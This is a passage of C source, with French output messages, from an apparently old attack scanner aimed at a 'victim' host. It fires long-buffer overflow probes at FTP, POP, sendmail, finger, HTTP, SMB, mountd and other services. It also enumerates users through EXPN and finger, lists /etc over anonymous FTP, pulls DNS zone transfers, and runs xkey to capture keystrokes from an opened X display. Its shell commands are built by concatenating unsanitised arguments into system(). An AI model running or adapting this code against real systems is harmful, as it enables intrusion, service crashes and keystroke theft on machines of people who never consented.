printf("ftpd stat: %s\n",recvbuf2);
printf("-------------------------------------------------------------\n");
printf("Info sur FTP:\n");
printf("-------------------------------------------------------------\n");
printf("ftpd rep:\n");
strcpy(ftp, "(sleep 2;echo anonymous | echo anonymous;echo ls;cd /etc;
echo ls /etc;sleep 2) | ftp ");   
strcat(ftp,argv[1]);  
printf("ps: presse sur 'enter' si ca block....\n"); 
system(ftp);
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("FTPD Teste buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"USER anonymous\n");
fdprintf(sockfd,"PASS anonymous\n");
fdprintf(sockfd,"CWD %s\r\n",overflow2);
fdprintf(sockfd,"MKD %s\r\n",overflow2);
fdprintf(sockfd,"CWD %s/%s\r\n",overflow2,overflow2);
fdprintf(sockfd,"MKD %s/%s\r\n",overflow2,overflow2);
fdprintf(sockfd,"help %s\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"FTPD overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"FTPD  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("FTPD Teste 2 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"USER anonymous\n");
fdprintf(sockfd,"PASS anonymous\n");
fdprintf(sockfd,"SITE UMASK %s\r\n",overflow2);
fdprintf(sockfd,"SITE IDLE %s\r\n",overflow2);
fdprintf(sockfd,"SITE CHMOD %s %s\r\n",overflow2,overflow2);
fdprintf(sockfd,"SITE EXEC %s %s\r\n",overflow2,overflow2);
fdprintf(sockfd,"SITE help %s\r\n",overflow2);
fdprintf(sockfd,"SITE GROUP %s\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"FTPD overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"FTPD  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("FTPD Teste 3 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"USER anonymous\n");
fdprintf(sockfd,"PASS anonymous\n");
fdprintf(sockfd,"STOU %s\r\n",overflow2);
fdprintf(sockfd,"LIST %s %s\r\n",overflow2,overflow2);
fdprintf(sockfd,"RNFR %s %s\r\n",overflow2,overflow2);
fdprintf(sockfd,"RNTO %s %s\r\n",overflow2,overflow2);
fdprintf(sockfd,"NLST %s\r\n",overflow2);
fdprintf(sockfd,"DELE %s\r\n",overflow2);
fdprintf(sockfd,"RMD %s\r\n",overflow2);
fdprintf(sockfd,"SIZE %s\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"FTPD overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"FTPD  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("FTPD Teste 4 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"USER anonymous\n");
fdprintf(sockfd,"PASS anonymous\n");
fdprintf(sockfd,"SITE GPASS %s\r\n",overflow2);
fdprintf(sockfd,"XMKD %s\r\n",overflow2);
fdprintf(sockfd,"XCWD %s\r\n",overflow2);
fdprintf(sockfd,"PORT 206,71,69,243,%s,%s\r\n",overflow2,overflow2);
fdprintf(sockfd,"RETR %s\r\n",overflow2);
fdprintf(sockfd,"STOR %s\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"FTPD overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"FTPD  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("FTPD Teste 5 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"%s\n",overflow2);
sleep(10);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"FTPD overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"FTPD  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin wuftp */
/* qpop */
if ((sockfd=connect_tcp(victim,110)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---qpop service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,110)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("--===qpop service ouvert===--\n");
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
for (i=0;;i++)
{
  if (types[i].name==NULL)
  {
    i=0;
    break;
  }
  if (strstr(recvbuf,types[i].name))
    break;
}
printf("Popd vulnerable?:\n");
printf("-------------------------------------------------------------\n");
if (i == 0) {
printf("service pop no vulnerable\n");
}
if (i == 11) {
printf("QPOP possible vulnerable\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,110)) > 0)
{
printf("Buffer overflows in password -> popd:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"user root\n");
fdprintf(sockfd,"pass %s\n",overflow);
sleep(2);
bzero(recvbuf2,sizeof(recvbuf2));
n=read(sockfd,recvbuf2,sizeof(recvbuf2));
if (n <= 0) {
  fprintf(stderr,"popd overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"popd  no overflowed !!\n");
}
printf("%s\n",recvbuf2);
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,110)) > 0)
{
printf("Buffer overflows in user -> popd:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"user %s\n",overflow);
fdprintf(sockfd,"pass %s\n",overflow);
sleep(2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"popd overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"popd  no overflowed !!\n");
}
printf("%s\n",recvbuf3);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin qpop */

/* sendmail */

if ((sockfd=connect_tcp(victim,25)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---sendmail service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===sendmail service ouvert===--\n");
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur sendmail\n");
}
printf("Sendmail version:\n");
printf("-------------------------------------------------------------\n");
printf("%s\n",recvbuf);
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("Sendmail EXPN:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"EXPN root\n");
fdprintf(sockfd,"EXPN guest\n");
sleep(5);
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur sendmail\n");
}
printf("%s\n",recvbuf);
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("Sendmail Teste buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"EXPN %s\r\n",overflow2);
fdprintf(sockfd,"VRFY %s\r\n",overflow2);
fdprintf(sockfd,"help %s\r\n",overflow2);
fdprintf(sockfd,"ETRN %s\r\n",overflow2);
fdprintf(sockfd,"HELO %s\r\n",overflow2);
fdprintf(sockfd,"HELO x.%s\r\n",overflow2);
fdprintf(sockfd,"HELO %s.x\r\n",overflow2);
fdprintf(sockfd,"EHLO %s\r\n",overflow2);
fdprintf(sockfd,"EHLO x.%s\r\n",overflow2);
fdprintf(sockfd,"EHLO %s.x\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Sendmail overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"Sendmail  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("Sendmail Teste 2 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"HELO x.x\n");
fdprintf(sockfd,"MAIL FROM: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"MAIL FROM: root@%s\r\n",overflow2);
fdprintf(sockfd,"MAIL FROM: %s\r\n",overflow2);
fdprintf(sockfd,"MAIL FROM a@yahoo.com\n");
fdprintf(sockfd,"RCPT TO: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"RCPT TO: root2@%s\r\n",overflow2);
fdprintf(sockfd,"RCPT TO: %s\r\n",overflow2);
fdprintf(sockfd,"RCPT TO: a2@yahoo.com\n");
fdprintf(sockfd,"DATA\n");
fdprintf(sockfd,"%s\r\n",overflow2);
fdprintf(sockfd,".\n");
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Sendmail overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"Sendmail  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("Sendmail Teste 3 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"HELO x.x\n");
fdprintf(sockfd,"SEND FROM: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"SEND FROM: root@%s\r\n",overflow2);
fdprintf(sockfd,"SEND FROM: root@%s\r\n",overflow2);
fdprintf(sockfd,"SEND FROM: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"SEND FROM: %s\r\n",overflow2);
fdprintf(sockfd,"SOML FROM: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"SOML FROM: root@%s\r\n",overflow2);
fdprintf(sockfd,"SOML FROM: %s\r\n",overflow2);
fdprintf(sockfd,"SAML FROM: %s@hotmail.com\r\n",overflow2);
fdprintf(sockfd,"SAML FROM: root@%s\r\n",overflow2);
fdprintf(sockfd,"SAML FROM: %s\r\n",overflow2);
fdprintf(sockfd,"ETRN %s\r\n",overflow2);
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Sendmail overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"Sendmail  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("Sendmail Teste 4 buffer overflow:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"HELO x.x\n");
fdprintf(sockfd,"MAIL FROM a@yahoo.com\n");
fdprintf(sockfd,"RCPT TO: a2@yahoo.com\n");
fdprintf(sockfd,"DATA\n");
fdprintf(sockfd,"%s\r\n",overflow2);
fdprintf(sockfd,".\n");
sleep(25);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Sendmail overflowed? !! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"Sendmail  no overflowed !!\n");
}
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin sendmail */


/* pop2 */
if ((sockfd=connect_tcp(victim,109)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---pop2 service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,109)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===pop2 service ouvert===--\n");
}
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
for (i=0;;i++)
{
  if (types[i].name==NULL)
  {
    i=0;
    break;
  }
  if (strstr(recvbuf,types[i].name))
    break;
}
printf("Pop2d Vulnerable?:\n");
printf("-------------------------------------------------------------\n");
if (i == 0) {
printf("pop2 pas vulnerable\n");
}
if (i == 12) {
printf("POP2 possible vulnerable\n");
}
printf("-------------------------------------------------------------\n");
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin pop2 */

/* telnet */

if ((sockfd=connect_tcp(victim,23)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---telnetd service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,23)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("--===telnetd service ouvert===--\n");
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
printf("Telnet version:\n");
printf("-------------------------------------------------------------\n");
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur telnet\n");
}
  printf("%s\n",recvbuf);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin telnet */

/* rsh */
if ((sockfd=connect_tcp(victim,513)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---rsh sur port 513 ferm�---\n");
}
if ((sockfd=connect_tcp(victim,513)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� via spoof pour rsh port 513===--\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
if ((sockfd=connect_tcp(victim,514)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---rsh sur port 514 ferm�---\n");
}
if ((sockfd=connect_tcp(victim,514)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� via spoof pour rsh port 514===--\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");

/* fin rsh */

/* msql */
if ((sockfd=connect_tcp(victim,1114)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---msql service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,1114)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� msql port 1114===--\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");

/* fin msql */

/* listen */
if ((sockfd=connect_tcp(victim,2766)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---listen service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,2766)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� listen port 2766===--\n");
printf("Teste buffer overflow Listen:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"%s\r\n",overflow);
sleep(1);
bzero(recvbuf2,sizeof(recvbuf2));
n=read(sockfd,recvbuf2,sizeof(recvbuf2));
if (n <= 0) {
  fprintf(stderr,"Possible buffer overflow!!!!! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"No buffer overflows\n");
}
printf("listen reponse to buffer overflow: %s\n",recvbuf2);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin listen */

/* xserv */
if ((sockfd=connect_tcp(victim,6000)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---xwindows port ferm�---\n");
}
if ((sockfd=connect_tcp(victim,6000)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� xwin===--\n");
strcpy(rpc, "xhost + ");
strcat(rpc, argv[1]);
system(rpc);
strcpy(rpc1, "xkey ");
strcat(rpc1, argv[1]);
strcat(rpc1, ":0");
system(rpc1);
strcpy(rpc2, "xhost - ");
strcat(rpc2, argv[1]);
system(rpc2);
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin xserv */
/* bootp */
if ((sockfd=connect_tcp(victim,67)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---bootp service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,67)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� bootp port 67===--\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");

/* fin bootp */
/* lpd */
if ((sockfd=connect_tcp(victim,1005)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---lpd service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,1005)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===Possible vulerabilit� lpd port 1005===--\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin lpd */ 

/* Finger */
if ((sockfd=connect_tcp(victim,79)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---finger service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,79)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("--===finger service ouvert===--\n");
printf("Info account via finger:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc3, "finger @");
strcat(rpc3,argv[1]);
system(rpc3);
strcpy(rpc31, "finger root@");
strcat(rpc31,argv[1]);
system(rpc31);
strcpy(rpc32, "finger guest@");
strcat(rpc32,argv[1]);
system(rpc32);
}
if ((sockfd=connect_tcp(victim,79)) > 0)
{
printf("-------------------------------------------------------------\n");
printf("Teste buffer overflow finger:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"%s\r\n",overflow2);
sleep(1);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Possible buffer overflow!!!!! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"No buffer overflows\n");
}
printf("finger reponse to buffer overflow: %s\n",recvbuf3);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin finger */

/* NFS */
if ((sockfd=connect_tcp(victim,2049)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---nfs service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,2049)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===NFS service ouvert===--\n");
printf("-------------------------------------------------------------\n");
printf("Info exporte NFS:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc01, "showmount -e ");
strcat(rpc01,argv[1]);
system(rpc01);
printf("-------------------------------------------------------------\n");
printf("-------------------------------------------------------------\n");
printf("Teste buffer overflows mountd:\n");
strcpy(rpc0, "./tm ");
strcat(rpc0,argv[1]);
strcat(rpc0," AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
system(rpc0);
printf("segmentation fault or connexion close => possible overflow\n");
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/*fin mountd */

/* amd */
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("++===Teste AMD vuln.===++\n");
if ((sockfd=connect_tcp(victim,111)) < 0)
{
printf("++++++++++++++++++++++++++++++\n");
  printf("---rpc service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,111)) > 0)
{
printf("++++++++++++++++++++++++++++++\n");
  printf("--===amd service possible ouvert===--\n");
  printf("teste buffer overflows amd:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc4, "/usr/sbin/amq -h ");
strcat(rpc4,argv[1]);
strcat(rpc4, " -M");
strcat(rpc4, overflow);
system(rpc4);
printf("segmentation fault or connexion close => possible overflow\n");
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin amd */

/* irc */
if ((sockfd=connect_tcp(victim,6667)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---irc service ferm� on port 6667---\n");
}
if ((sockfd=connect_tcp(victim,6667)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 printf("--===port irc 6667 ouvert===--\n");
 printf("possible serveur irc vulnerable?\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin irc */

/* soltera */
if ((sockfd=connect_tcp(victim,49363)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---soltera service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,49363)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 printf("--===soltera service ouvert===--\n");
 printf("possible vulnerabilit�e?\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin soltera */

/* bnc */
if ((sockfd=connect_tcp(victim,6667)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---bnc service ferm� on port 6667?---\n");
}
if ((sockfd=connect_tcp(victim,6667)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 printf("--===port bnc 6667 ouvert?===--\n");
 printf("possible serveur bnc vulnerable?\n");
printf("Teste buffer overflows in USER cmd(authenticate):\n");
printf("-------------------------------------------------------------\n");
 fdprintf(sockfd,"USER %s\r\n",overflow2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur bnc or possible overflow\n");
printf("-------------------------------------------------------------\n");
}
else {
printf("reponse to overflows: %s\n",recvbuf3);
printf("-------------------------------------------------------------\n");
 }
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin bnc */

/* smb */
if ((sockfd=connect_tcp(victim,139)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---smbd service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,139)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("--===smbd service ouvert===--\n");
printf("smbd info:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc51, "smbclient -L ");
strcat(rpc51, argv[1]);
system(rpc51);
printf("-------------------------------------------------------------\n");
printf("smbd teste overflow:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc5, "smbclient \\\\\\\\LOCALHOST\\\\IPC$ ");
strcat(rpc5, overflow);
strcat(rpc5, " -I");
strcat(rpc5, argv[1]);
system(rpc5);
printf("-------------------------------------------------------------\n");
printf("smbd teste 2 overflow:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc52, "smbclient \\\\\\\\LOCALHOST\\\\SOMESHARE$ -U ");
strcat(rpc52, overflow);
strcat(rpc52, " -I");
strcat(rpc52, argv[1]);
system(rpc52);
printf("-------------------------------------------------------------\n");
printf("smbd teste 3 overflow:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc53, "smbclient \\\\\\\\LOCALHOST\\\\SOMESHARE$ -U ' ' -W WORKGROUP");
strcat(rpc53, " -n ");
strcat(rpc53, overflow); 
strcat(rpc53, " -N");
strcat(rpc53, " -I");
strcat(rpc53, argv[1]);
system(rpc53);
printf("-------------------------------------------------------------\n");
printf("smbd teste 4 overflow:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc54, "smbclient \\\\\\\\LOCALHOST\\\\SOMESHARE$ -U ' ' -W ");
strcat(rpc54, overflow);
strcat(rpc54, " -n LOCALHOST -N");
strcat(rpc54, " -I");
strcat(rpc54, argv[1]);
system(rpc54);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin smb */

/* rpc */
if ((sockfd=connect_tcp(victim,111)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---rpc service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,111)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===rpc service ouvert===--\n");
printf("RPCINFO:\n");
printf("-------------------------------------------------------------\n");
strcpy(rpc6, "rpcinfo -p ");
strcat(rpc6, argv[1]);
system(rpc6);
printf("-------------------------------------------------------------\n");
printf("vuln list: \n");
printf("-------------------------------------------------------------\n");
printf("nisd (solarys),cmsd munix),ttbd(solarys,irix,hpux),pcnfsd(munix),\n
        statd(??), nsfd (munix), talkd(linux , bsd), nlock(??),       \n 
        autofsd(??), walld(??)\n");
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin rpc */

/* named */
if ((sockfd=connect_tcp(victim,53)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---named service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,53)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("--===named service ouvert===--\n");
printf("Named version:\n");
printf("-------------------------------------------------------------\n");
strcpy(named, "./named '");
strcat(named, argv[1]);
strcat(named, "'");
system(named);
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin named */

/* cgi 
if ((sockfd=connect_tcp(victim,80)) < 0)
{
  fprintf(stderr,"serveur http ferm�\n");
}
if ((sockfd=connect_tcp(victim,80)) > 0)
{
  if ((cgitest=cgit(victim)) < 0) {
printf("probleme cgi test\n"); 
}
}
fin cgi */
/* cgi */
if ((sockfd=connect_tcp(victim,80)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---serveur http ferm�---\n");
}
if ((sockfd=connect_tcp(victim,80)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===serveur http ouvert===--\n");
  printf("Http version & cgi:\n");
printf("-------------------------------------------------------------\n");
strcpy(named, "./cgi ");
strcat(named, argv[1]);
system(named);
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,80)) > 0)
{
 printf("Http teste overflows:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"GET %s HTTP/1.0\n\n",overflow2);
fdprintf(sockfd,"GET %s\r\n",overflow2);
sleep(2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Overflow!!! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"No overflow\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,80)) > 0)
{
 printf("Http teste 2 overflows:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"%s /cgi-bin/ HTTP/1.0\n\n",overflow2);
fdprintf(sockfd,"%s\r\n",overflow2);
sleep(2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Overflow!!! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"No overflow\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,80)) > 0)
{
printf("Http teste 3 overflows:\n");
printf("-------------------------------------------------------------\n");
fdprintf(sockfd,"GET /cgi-bin/%s HTTP/1.0\n\n",overflow2);
sleep(2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  fprintf(stderr,"Overflow!!! :o)\n");
}
if (n > 0) {
  fprintf(stderr,"No overflow\n");
}
printf("-------------------------------------------------------------\n");
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* eof cgi */
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
printf("+++++++++++++++++++++++++++++\n");
printf("Info on victime:\n");
printf("+++++++++++++++++++++++++++++\n");
printf("-------------------------------------------------------------\n");
printf("Host -l ...: \n");
strcpy(hostl, "host -l -v -t any ");
strcat(hostl, argv[1]);
system(hostl);
printf("Dig: \n");
strcpy(dig, "dig ");
strcat(dig, argv[1]);
system(dig);
printf("Traceroute: \n");
strcpy(trace, "/usr/sbin/traceroute ");
strcat(trace, argv[1]);
system(trace);
printf("-------------------------------------------------------------\n");
printf("+++++++++++++++++++++++++++++\n");
printf("Tcp Seq spoofing:\n");
printf("+++++++++++++++++++++++++++++\n");
printf("-------------------------------------------------------------\n");
